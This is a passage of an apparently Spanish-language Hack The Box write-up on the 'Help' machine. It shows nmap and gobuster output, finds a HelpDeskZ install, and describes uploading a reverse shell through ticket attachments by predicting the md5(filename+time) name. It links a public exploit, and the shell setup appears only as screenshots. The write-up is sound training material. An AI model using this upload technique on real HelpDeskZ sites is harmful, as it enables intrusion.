22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;application/json&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
TCP/IP fingerprint:
OS:SCAN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%E&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1/19%OT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22%CT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%CU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;32374%PV&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2%DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;T%G&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%TM&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5C440D3
OS:6%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;SEQ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;108%GCD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%ISR&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10B%TI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%CI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;I%II&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;I%TS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;OPS
OS:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;O1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNT11NW7%O4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST1
OS:1NW7%O6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;WIN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;W1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ECN
OS:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7210%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW7%CC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;O%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A
OS:S%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T3&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;R%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%F
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;R%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T7&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;U1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%
OS:T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%IPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;164%UN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RID&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;IE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%CD
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 143/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   168.27 ms 10.10.12.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   233.79 ms 10.10.10.121

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Sat Jan &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; 23:55:02 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 74.09 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_171654.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nodejs---puerto-3000&#34;&gt;NODEJS - PUERTO 3000&lt;/h2&gt;
&lt;p&gt;En este puerto, al visitarlo en firefox nos muestra un mensaje del tipo json.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hi Shiv, To get access please find the credentials with given query&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Realizamos una busquedad de directorios y archivos con gobuser.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/help/stuff# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.121/ -np -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt

&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.121/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : php,html,txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
18:29:01 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/support &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
18:32:32 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;support&#34;&gt;/support/&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.121/support/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : php,html,txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
18:34:31 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/captcha.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/controllers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/readme.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/uploads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/views &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
18:37:12 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;helpdeskz&#34;&gt;HelpDeskZ&lt;/h2&gt;
&lt;p&gt;En el la direccion &lt;code&gt;/support&lt;/code&gt; encontramos una plataforma &lt;code&gt;HelpDeskZ&lt;/code&gt; para soporte de sitios web.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_174038.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Investigamos acerca de esta plataforma y encontramos que podemos subir una shell mediante la creacion de un ticket en la plataforma, y tambien encontramos un exploit que se aprovecha de esta vulnerabilidad, dicho exploit se le pasa la url de la plataforma y el nombre de la shell que subimos, con estos parametros el exploit generar un hash md5 con el nombre del archivo y la hora actual.&lt;/p&gt;
&lt;p&gt;Exploit: &lt;a href=&#34;https://www.exploit-db.com/exploits/40300&#34;&gt;https://www.exploit-db.com/exploits/40300&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;La razon por la cual el exploit genera un hash md5 es porque la plataforma al subir un archivo genera un hash md5 con el nombre del archivo y la hora actual, para luego renombrar el archivo con el hash y guardarlo en &lt;code&gt;/uploads/tickets/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$filename = md5($_FILES[&amp;#39;attachment&amp;#39;][&amp;#39;name&amp;#39;].time()).&amp;#34;.&amp;#34;.$ext;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien que tomar en cuenta que los archivos que se agregan al ticket se guardan en el directorio &lt;code&gt;/uploads/tickets/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Codigo de pagina de tickets:&lt;br /&gt;
&lt;a href=&#34;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/view_tickets_controller.php&#34;&gt;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/view_tickets_controller.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos una reverse shell para poder ejecutar comandos dentro de la plataforma para ello vamos  renombrar nuestra reverse shell con caracteres null al final del archivo.&lt;/p&gt;
&lt;p&gt;Configuracion Reverse shell:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_213126.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_175934.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
